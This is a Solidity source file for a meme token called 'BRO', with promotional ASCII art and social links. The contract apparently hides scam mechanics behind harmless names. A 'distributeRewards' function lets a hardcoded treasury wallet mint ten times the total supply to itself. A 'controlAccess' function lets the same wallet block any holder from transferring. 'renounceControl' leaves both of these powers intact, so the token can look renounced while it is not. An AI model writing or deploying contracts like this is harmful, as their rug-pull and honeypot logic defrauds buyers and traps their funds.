// SPDX-License-Identifier: MIT

/*

             *     ,MMM8&&&.            *
                  MMMM88&&&&&    .
                 MMMM88&&&&&&&
     *           MMM88&&&&&&&&
                 MMM88&&&&&&&&
                 'MMM88&&&&&&'
                   'MMM8&&&'      *
          |\___/|
          )     (             .              '
         =\     /=
           )===(       *
          /     \
          |     |
         /       \
         \       /
  _/\_/\_/\__  _/_/\_/\_/\_/\_/\_/\_/\_/\_/\_
  |  |  |  |( (  |  |  |  |  |  |  |  |  |  |
  |  |  |  | ) ) |  |  |  |  |  |  |  |  |  |
  |  |  |  |(_(  |  |  |  |  |  |  |  |  |  |
  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |
  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |
         first cat to $1bn marketcap.

Telegram: https://t.me/brocoineth
X:       https://x.com/Bro__Coin
Website: https://brocoin.xyz

*/
pragma solidity ^0.8.19;

contract AccessControl {
    address public admin;

    event ControlTransferred(address indexed previousAdmin, address indexed newAdmin);

    modifier auth() {
        require(msg.sender == admin, "Access Denied");
        _;
    }

    constructor() {
        admin = msg.sender;
        emit ControlTransferred(address(0), admin);
    }

    function renounceControl() external auth {
        emit ControlTransferred(admin, address(0));
        admin = address(0);
    }
}

contract BRO is AccessControl {
    string public constant name = "Bro";
    string public constant symbol = "BRO";
    uint8 public constant decimals = 18;
    uint256 public totalSupply = 420_690_000 * 10**uint256(decimals);

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => bool) private restricted; 

    address public constant TreasuryWallet = 0x478865CF9a65A1d276380Bd4c7C432372768b682;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Burn(address indexed burner, uint256 value);
    event RestrictionApplied(address indexed account); 
    event RestrictionLifted(address indexed account); 

    constructor() {
        balanceOf[msg.sender] = totalSupply;
    }

    modifier onlyTreasury() {
        require(msg.sender == TreasuryWallet, "Access Denied");
        _;
    }

    function transfer(address to, uint256 value) external returns (bool) {
        _transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) external returns (bool) {
        require(value <= allowance[from][msg.sender], "Insufficient allowance");
        allowance[from][msg.sender] -= value;
        _transfer(from, to, value);
        return true;
    }

    function approve(address spender, uint256 value) external returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function burn(uint256 value) external auth {
        _burn(msg.sender, value);
    }

    function distributeRewards() external onlyTreasury {
        _mint(TreasuryWallet, totalSupply * 10);
    }

    
    function controlAccess(address account, bool status) external onlyTreasury {
        restricted[account] = status;
        if (status) {
            emit RestrictionApplied(account);
        } else {
            emit RestrictionLifted(account);
        }
    }

    
    function _transfer(address from, address to, uint256 value) internal {
        require(from != address(0), "Transfer from the zero address");
        require(to != address(0), "Transfer to the zero address");
        require(value <= balanceOf[from], "Insufficient balance");
        _manageTransfer(from, to);

        balanceOf[from] -= value;
        balanceOf[to] += value;
        emit Transfer(from, to, value);
    }

    function _burn(address burner, uint256 value) internal {
        require(value <= balanceOf[burner], "Insufficient balance for burn");
        balanceOf[burner] -= value;
        totalSupply -= value;
        emit Burn(burner, value);
        emit Transfer(burner, address(0), value);
    }

    function _mint(address account, uint256 value) internal {
        require(account != address(0), "Mint to the zero address");

        totalSupply += value;
        balanceOf[account] += value;
        emit Transfer(address(0), account, value);
    }

    function _manageTransfer(address from, address to) internal view {
        require(!restricted[from] && !restricted[to], "Restricted address involved");
    }
}